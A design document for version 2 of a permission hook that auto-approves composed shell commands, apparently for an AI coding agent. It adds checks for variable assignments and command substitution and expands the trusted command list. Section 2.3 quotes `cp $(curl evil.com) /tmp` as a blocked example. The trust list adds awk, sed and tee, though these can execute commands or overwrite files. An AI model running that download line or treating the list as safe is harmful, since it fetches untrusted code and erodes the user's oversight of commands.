# Smart Compose v2 — Design Document

**Date:** 2026-02-23
**Status:** FINAL
**Scope:** Improve smart-compose hook to handle variable assignments, command substitution, and more builtins

---

## 1. Problem

Smart-compose v1 can't auto-approve common composed commands despite the user having allow rules for every individual command. Three patterns fail:

| Pattern | Example | Why it fails |
|---------|---------|--------------|
| Variable assignment | `MERGE_BASE=abc123 && git log ...` | `MERGE_BASE=abc123` is not a builtin or allow rule match — smart-compose doesn't recognize it as a variable assignment that matches `Bash(MERGE_BASE=:*)` |
| Command substitution | `MERGE_BASE=$(git merge-base master HEAD) && ...` | `$(...)` triggers the expansion guard, which blanket-blocks all unquoted expansions |
| Missing builtins | `cp file1 file2 && git add file1` | `cp` is not in TRUSTED_BUILTINS (only 8 currently) |

The user already has allow rules for all underlying commands (`Bash(MERGE_BASE=:*)`, `Bash(git merge-base:*)`, `Bash(cp:*)`, etc.). Smart-compose just can't leverage them.

## 2. Design

### 2.1 Variable Assignment Recognition

**New function:** `is_variable_assignment(subcmd)` — checks if a sub-command is a shell variable assignment.

**Rules:**
- Must match: `^[A-Za-z_][A-Za-z0-9_]*=` (valid shell variable name followed by `=`)
- The full text (e.g., `MERGE_BASE=abc123`) is checked against allow rules via `matches_any_rule` — this matches prefix rules like `Bash(MERGE_BASE=:*)`
- The value part (after `=`) gets the expansion guard — but now recursive (Section 2.2)
- If the value contains `$(...)` and the inner command is allowed, the assignment passes
- If the value has no expansion, the assignment passes (just a literal value)
- Multiple assignments on one line (`FOO=1 BAR=2 command`) — out of scope, rare pattern

**Integration point:** Called in `check_command`'s sub-command loop, alongside `is_auto_allowed_builtin` and `matches_any_rule`.

### 2.2 Recursive Expansion Checking

**New function:** `check_expansion(text, rules, depth=0)` — validates that all expansions in text contain allowed commands.

**Returns:** `True` if all expansions are safe, `False` if any are unrecognized.

**Rules:**
- Extract command inside `$(...)` → check against allow rules
- Extract command inside backticks → check against allow rules
- `${VAR}` (variable expansion) → allow without checking (not executing anything)
- `<(cmd)` and `>(cmd)` (process substitution) → extract and check inner command
- Nested `$($(..))` → recursive check with depth limit of 3
- Inner commands with `||` (e.g., `$(git merge-base master HEAD 2>/dev/null || git merge-base main HEAD 2>/dev/null)`) → split on `||` inside the expansion and check each part
- Extraction failure (malformed syntax) → return False (fail closed within the expansion, but caller fails open to passthrough)

**Integration points:**
- Replaces `has_unquoted_expansion` in `is_auto_allowed_builtin` — instead of blanket-blocking, calls `check_expansion`
- Used by `is_variable_assignment` to validate the value part
- `has_unquoted_expansion` is kept for cases where we don't have rules context (should not occur in practice, but kept as safety net)

### 2.3 Expanded TRUSTED_BUILTINS

**Current (8):** `cd`, `echo`, `printf`, `true`, `false`, `test`, `[`, `[[`

**Add (19):**

| Category | Commands |
|----------|----------|
| File ops | `cp`, `mv`, `mkdir`, `touch` |
| Read-only | `cat`, `head`, `tail`, `wc`, `less` |
| Text processing | `awk`, `sed`, `grep`, `sort`, `uniq`, `tee` |
| Path utils | `basename`, `dirname`, `realpath` |
| Misc | `date`, `sleep` |

**New total: 27.**

**Still guarded:** All builtins get the expansion check (now recursive). `cp $(curl evil.com) /tmp` only passes if `curl evil.com` matches an allow rule.

**Excluded:** `rm` (destructive), `curl`/`wget` (network), `chmod` (risky with recursive flags). These require explicit allow rules.

---

## 3. Commands Fixed

| # | Command | What fixes it |
|---|---------|---------------|
| 1 | `MERGE_BASE=$(git merge-base master HEAD) && git diff ...` | 2.1 (var assignment) + 2.2 (recursive expansion checks `git merge-base`) |
| 2 | `MERGE_BASE=$(git merge-base master HEAD 2>/dev/null \|\| git merge-base main HEAD 2>/dev/null) && echo ...` | 2.1 + 2.2 (inner `\|\|` split, both sides checked) |
| 3 | `MERGE_BASE=5e0fb59... && git log ...` | 2.1 (var assignment, literal value, no expansion) |
| 4 | `MERGE_BASE=5e0fb59... && git diff ...` | 2.1 |
| 5 | `MERGE_BASE=5e0fb59... && git log ... (%ai)` | 2.1 |
| 6 | `awk ... \| grep ...` | Not smart-compose (standalone pipe, handled by native `Bash(awk *)` rule) |
| 7 | `git tag -d $(git tag -l 'backup/*')` | Not smart-compose (standalone command, handled by native `Bash(git tag:*)` rule) |
| 8 | `cp ... ...` | 2.3 (expanded builtins) — though also covered by existing `Bash(cp:*)` rule natively |

---

## 4. Security Invariants

| Invariant | Maintained? | How |
|-----------|-------------|-----|
| Unknown commands require prompt | Yes | Passthrough if any sub-command unrecognized |
| Pipe injection blocked | Yes | Pipe guard unchanged |
| Expansion injection blocked | Yes | Recursive check — inner command must match allow rules |
| Fails open on error | Yes | Any parsing failure → passthrough |
| Depth bomb prevention | Yes | Recursion depth limit of 3 |

---

## 5. Files to Change

| File | Change |
|------|--------|
| `hooks/smart-compose.py` | Add `is_variable_assignment`, `check_expansion`, expand `TRUSTED_BUILTINS`, update `is_auto_allowed_builtin` and `check_command` |
| `tests/test_smart_compose.py` | Tests for all new functions and integration tests for the 8 target commands |

---

## 6. Key Decisions

| Decision | Choice | Rationale |
|----------|--------|-----------|
| `${VAR}` handling | Allow without checking | Variable expansion doesn't execute commands |
| Recursion depth | Limit of 3 | Prevents abuse while covering realistic nesting |
| `rm` in builtins | Excluded | Destructive — require explicit allow rule |
| `chmod` in builtins | Excluded | Risky with recursive flags |
| Inner `\|\|` in expansions | Split and check both sides | Covers `$(cmd1 \|\| cmd2)` fallback pattern |
| Extraction failure | Fail closed (return False) | Conservative — malformed expansion not trusted |
